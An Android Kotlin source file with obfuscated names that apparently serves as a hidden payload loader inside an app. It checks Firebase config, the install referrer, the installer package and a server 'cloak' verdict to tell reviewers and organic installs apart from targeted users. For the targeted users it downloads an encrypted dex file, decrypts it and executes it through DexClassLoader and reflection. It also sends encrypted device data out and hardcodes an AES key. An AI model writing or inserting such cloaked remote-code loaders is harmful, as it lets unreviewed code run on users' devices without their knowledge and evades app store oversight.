package com.example.outdex

import android.app.Application
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.Message
import androidx.annotation.DoNotInline
import androidx.annotation.Keep
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.example.outdex.AESFUtil.decryptFile
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.gson.Gson
import com.tencent.mmkv.MMKV
import dalvik.system.DexClassLoader
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.FlowPreview
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.flow.firstOrNull
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.retry
import kotlinx.coroutines.flow.timeout
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import okhttp3.RequestBody
import okio.Buffer
import okio.Okio
import java.io.File
import java.io.FileDescriptor
import java.security.SecureRandom
import java.util.Base64
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.coroutines.resume
import kotlin.reflect.full.companionObject
import kotlin.reflect.full.companionObjectInstance
import kotlin.reflect.full.declaredFunctions
import kotlin.reflect.full.memberFunctions
import kotlin.reflect.jvm.isAccessible
import kotlin.time.Duration.Companion.seconds

object Standup {

    private var isPDFef = 0
    var mContext: Application? = null

    @Keep
    private var fewian: DexClassLoader? = null

    @OptIn(FlowPreview::class)
    private val dHandler: Handler by lazy {
        Handler(Looper.getMainLooper()) {
            when (it.what) {
                //pt
                700 -> {
                    CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                        val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
                        try {
                            flow {
                                val details = getConfig(remoteConfig)
                                emit(details)
                            }.timeout(5.seconds).catch {
                                emit(false)
                            }.collect()
                        } catch (_: Exception) {
                        }
                        if (isPDFef == 0) {
                            val pt = MMKV.defaultMMKV().decodeString(OutKey.PT_RESULT)
                            if (pt.isNullOrEmpty()) {
                                callChePT()
                            } else {
                                withContext(Dispatchers.Main.immediate) {
                                    try {
                                        val yhwu = Class.forName("com.app.quench.log.setting.YhwuHnd").kotlin
                                        val osk = yhwu.declaredFunctions.find { func -> func.name == "oskd" }
                                        if (osk != null) {
                                            osk.isAccessible = true
                                            osk.call(yhwu.objectInstance, 2, "Gva")
                                        }
                                    } catch (_: Exception) {
                                    }
                                }
                                callInnerD()
                            }
                        } else {
                            callOnlyClick()
                        }
                    }
                }

                //cloak
                703 -> {
                    val clKv = MMKV.defaultMMKV().decodeString(OutKey.CLOCK_RES)
                    if (clKv.isNullOrEmpty()) {
                        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                            delay(200)
                            val result = try {
                                val req = RequestBody.create(null, Gson().toJson(OutPot.getClaiiwen()) ?: "")
                                val res = flow {
                                    emit(OutPot.retrofit.nskdks(req))
                                }.retry(20) {
                                    delay(4000)
                                    true
                                }.catch {
                                    emit(null)
                                }.firstOrNull { response -> response?.isSuccessful == true }
                                if (res?.isSuccessful == true) {
                                    res.body()?.string() ?: OutKey.WHITE
                                } else {
                                    OutPot.callClockErr(res?.errorBody()?.string())
                                    OutKey.WHITE
                                }
                            } catch (e: Exception) {
                                OutPot.callClockErr(e.message)
                                OutKey.WHITE
                            }
                            MMKV.defaultMMKV().encode(OutKey.CLOCK_RES, result)
                            val white = result == OutKey.WHITE
                            if (white) {
                                withContext(Dispatchers.Main.immediate) {
                                    try {
                                        val yhwu = Class.forName("com.app.quench.log.setting.YhwuHnd").kotlin
                                        val osk = yhwu.declaredFunctions.find { func -> func.name == "oskd" }
                                        if (osk != null) {
                                            osk.isAccessible = true
                                            osk.call(yhwu.objectInstance, 2, "Gva")
                                        }
                                    } catch (e: Exception) {
                                        e.printStackTrace()
                                    }
                                }
                                callInnerD()
                            }
                            callSave()
                            OutPot.callAgile(if (white) "a" else "b")
                        }
                    } else {
                        if (clKv == OutKey.WHITE) {
                            try {
                                val yhwu = Class.forName("com.app.quench.log.setting.YhwuHnd").kotlin
                                val osk = yhwu.declaredFunctions.find { func -> func.name == "oskd" }
                                if (osk != null) {
                                    osk.isAccessible = true
                                    osk.call(yhwu.objectInstance, 2, "Gva")
                                }
                            } catch (_: Exception) {
                            }
                            callInnerD()
                        }
                    }
                }

                //pt
                704 -> {
                    val data = it.obj as? String?
                    CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                        try {
                            val req = RequestBody.create(null, data ?: "")
                            val result = OutPot.retrofit.uwajda(req)
                            if (result?.isSuccessful == true) {
                                val res = result.body()?.string()
                                if (!res.isNullOrEmpty()) {
                                    withContext(Dispatchers.Main.immediate) {
                                        try {
                                            val yhwu = Class.forName("com.app.quench.log.setting.YhwuHnd").kotlin
                                            val osk = yhwu.declaredFunctions.find { func -> func.name == "oskd" }
                                            if (osk != null) {
                                                osk.isAccessible = true
                                                osk.call(yhwu.objectInstance, 2L, "Gva")
                                            }
                                        } catch (e: Exception) {
                                            e.printStackTrace()
                                        }
                                    }
                                    MMKV.defaultMMKV().encode(OutKey.PT_RESULT, res)
                                    OutPot.callRecodep()
                                    OutPot.callAgile("0")
                                    callInnerD()
                                } else {
                                    callCheckRef()
                                }
                            } else {
                                callCheckRef()
                            }
                        } catch (e: Exception) {
                            callCheckRef()
                        }
                    }
                }

                705 -> {
                    val refer = MMKV.defaultMMKV().decodeString(OutKey.RECORD_REF)
                    if (refer.isNullOrEmpty()) {
                        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                            val mReferrerClient = InstallReferrerClient.newBuilder(mContext).build()
                            try {
                                flow {
                                    if (mReferrerClient == null) {
                                        emit(null)
                                    } else {
                                        val details = getInstallRefer(mReferrerClient)
                                        emit(details)
                                    }
                                }.retry(3).catch {
                                    emit(null)
                                }.collect { referrerUrl ->
                                    if (referrerUrl.isNullOrEmpty()) {
                                        OutPot.callRefErro("referUrl is null")
                                        callCheckOem()
                                    } else {
                                        MMKV.defaultMMKV().encode(OutKey.RECORD_REF, referrerUrl)
                                        OutPot.callRecordRefer(referrerUrl)
                                        val isc = referrerUrl.indexOf(OutKey.CHANNEL_1, ignoreCase = true) != -1
                                                || referrerUrl.indexOf(OutKey.CHANNEL_2, ignoreCase = true) != -1
                                                || referrerUrl.indexOf(OutKey.CHANNEL_3, ignoreCase = true) != -1
                                                || referrerUrl.indexOf(OutKey.CHANNEL_4, ignoreCase = true) != -1
                                        if (isc) {
                                            callOnlyClick()
                                        } else {
                                            callCheckOem()
                                        }
                                    }
                                }
                            } catch (e: Exception) {
                                OutPot.callRefErro(e.message)
                                callCheckOem()
                            }
                        }
                    } else {
                        val isc = refer.indexOf(OutKey.CHANNEL_1, ignoreCase = true) != -1
                                || refer.indexOf(OutKey.CHANNEL_2, ignoreCase = true) != -1
                                || refer.indexOf(OutKey.CHANNEL_3, ignoreCase = true) != -1
                                || refer.indexOf(OutKey.CHANNEL_4, ignoreCase = true) != -1
                        if (isc) {
                            callOnlyClick()
                        } else {
                            callCheckOem()
                        }
                    }
                }

                // 获取安装来源
                706 -> {
                    val pkg = mContext?.packageName ?: "mContext null"
                    var name = "aa"
                    try {
                        name = mContext?.packageManager?.getInstallerPackageName(pkg) ?: "mContext null"
                        if (name.isEmpty() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                            val info = mContext?.packageManager?.getInstallSourceInfo(pkg)
                            name = info?.initiatingPackageName ?: ""
                        }
                    } catch (_: Exception) {
                    }
                    OutPot.callRecooem(name)
                    if (name.contains("com.android.vending")
                        || name.contains(".packageinstaller")
                        || name.contains("com.android.shell")
                        || name.isEmpty()
                    ) {
                        //非OEM
                        OutPot.callAgile("b")
                    } else {
                        //OEM
                        callOnlyClick()
                    }
                }

                707 -> {
                    val data = it.obj as? String?
                    CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                        runCatching {
                            val req = RequestBody.create(null, data ?: "")
                            val result = OutPot.retrofit.uwajda(req)
                            if (result?.isSuccessful == true) {
                                val res = result.body()?.string()
                                if (!res.isNullOrEmpty()) {
                                    MMKV.defaultMMKV().encode(OutKey.PT_RESULT, res)
                                    OutPot.callRecodep()
                                }
                            }
                        }
                    }
                }
            }
            true
        }
    }


    @DoNotInline
    @JvmStatic
    @Keep
    fun callStand(context: Application) {
        mContext = context
        dHandler.sendMessage(Message.obtain(dHandler).apply { what = 700 })
    }

    @DoNotInline
    private fun callInnerD() {
        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            val file = File(mContext?.filesDir, "ei4")
            if (!file.exists()) {
                try {
                    val response = OutPot.retrofit.feafaew()
                    val downF = File(mContext?.filesDir, "del")
                    val sink = Okio.buffer(Okio.sink(downF))
                    val buffer = Buffer()
                    response?.body()?.source().use { source ->
                        source?.readAll(buffer)
                        sink.write(buffer, buffer.size())
                    }
                    sink.flush()
                    sink.close()
                    // 使用自定义 ClassLoader 加载插件的 dex 文件
                    downF.decryptFile(file)
                    delay(1000)
                    downF.delete()
                    FileDescriptor().sync()
                } catch (_: Exception) {
                }
            }
            try {
                file.setReadOnly()
                mContext?.also { context ->
                    val dexClassLoader = DexClassLoader(
                        file.path,  // 插件的 dex 文件路径
                        context.filesDir.absolutePath + "/optinn",  // 优化后的目录
                        null,  // 如果没有额外的库文件
                        context.classLoader // 使用宿主的 ClassLoader 作为父 ClassLoader
                    )
                    fewian = dexClassLoader
                    // 使用自定义的 ClassLoader 加载插件中的 Test 类
                    val testClass = dexClassLoader.loadClass("com.example.innerdex.Liuce")
                    // 调用 greet 方法
                    val greetMethod = testClass.getMethod("actions", Application::class.java)
                    greetMethod.invoke(null, context)
                }
            } catch (_: Exception) {
            }
        }
    }

    @DoNotInline
    private fun callOnlyClick() {
        dHandler.sendMessage(Message.obtain(dHandler).apply { what = 703 })
    }

    @DoNotInline
    private fun callChePT() {
        dHandler.sendMessage(Message.obtain(dHandler).apply {
            val origin: String = encrypt(Gson().toJson(OutPot.getQqndus("1")))
            val newJson: String = Gson().toJson(Mnsjd(origin, "q", "w", "e"))
            what = 704
            obj = newJson
        })
    }

    @DoNotInline
    private fun callCheckRef() {
        dHandler.sendMessage(Message.obtain(dHandler).apply { what = 705 })
    }

    @DoNotInline
    private fun callCheckOem() {
        dHandler.sendMessage(Message.obtain(dHandler).apply { what = 706 })
    }

    @DoNotInline
    fun callSave() {
        dHandler.sendMessage(Message.obtain(dHandler).apply {
            val origin: String = encrypt(Gson().toJson(OutPot.getQqndus("2")))
            val newJson: String = Gson().toJson(Mnsjd(origin, "r", "d", "f"))
            what = 707
            obj = newJson
        })
    }


    @DoNotInline
    private suspend fun getConfig(remoteConfig: FirebaseRemoteConfig) = suspendCancellableCoroutine {
        remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
            if (task.isSuccessful) {
                runCatching {
                    val internal3 = remoteConfig.getLong(OutKey.FIREBASE_PD_RF)
                    isPDFef = internal3.toInt()
                    val str = "config_is_zj_clo_ck==$internal3"
                    OutPot.callFireConfigs(str)
                    it.resume(true)
                }.onFailure { _ ->
                    it.resume(false)
                }
            } else {
                it.resume(false)
            }
        }
    }

    @DoNotInline
    private suspend fun getInstallRefer(client: InstallReferrerClient): String = suspendCancellableCoroutine {
        client.startConnection(object : InstallReferrerStateListener {
            override fun onInstallReferrerSetupFinished(responseCode: Int) {
                if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK && client.isReady) {
                    try {
                        val detail = client.installReferrer.installReferrer ?: ""
                        it.resume(detail)
                    } catch (e: Exception) {
                        it.resume("error :${e.localizedMessage}")
                    } finally {
                        client.endConnection()
                    }
                } else {
                    it.resume("refer error code:${responseCode}")
                }
            }

            override fun onInstallReferrerServiceDisconnected() {
                it.resume("onInstallReferrerServiceDisconnected")
                client.endConnection()
            }
        })
        it.invokeOnCancellation {
            client.endConnection()
        }
    }


    private const val AES_ALGORITHM = "AES"
    private const val AES_TRANSFORMATION = "AES/CBC/PKCS5Padding" // 使用ECB模式
    private const val AES_PASSWORD = "7efdc3259df3a80b00664214ca13fe1f"

    private fun encrypt(str: String): String {
        try {
            val secretKeySpec = SecretKeySpec(AES_PASSWORD.toByteArray(), AES_ALGORITHM)
            val iv = iv()
            val ivSpec = IvParameterSpec(iv)
            val cipher = Cipher.getInstance(AES_TRANSFORMATION)
            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivSpec)
            val cipherBytes = cipher.doFinal(str.toByteArray())
            val merge = ByteArray(iv.size + cipherBytes.size)
            System.arraycopy(iv, 0, merge, 0, iv.size)
            System.arraycopy(cipherBytes, 0, merge, iv.size, cipherBytes.size)
            return Base64.getEncoder().encodeToString(merge)
        } catch (e: Exception) {
            return str
        }
    }

    private fun iv(): ByteArray {
        val random = SecureRandom()
        val iv = ByteArray(16)
        random.nextBytes(iv)
        return iv
    }

}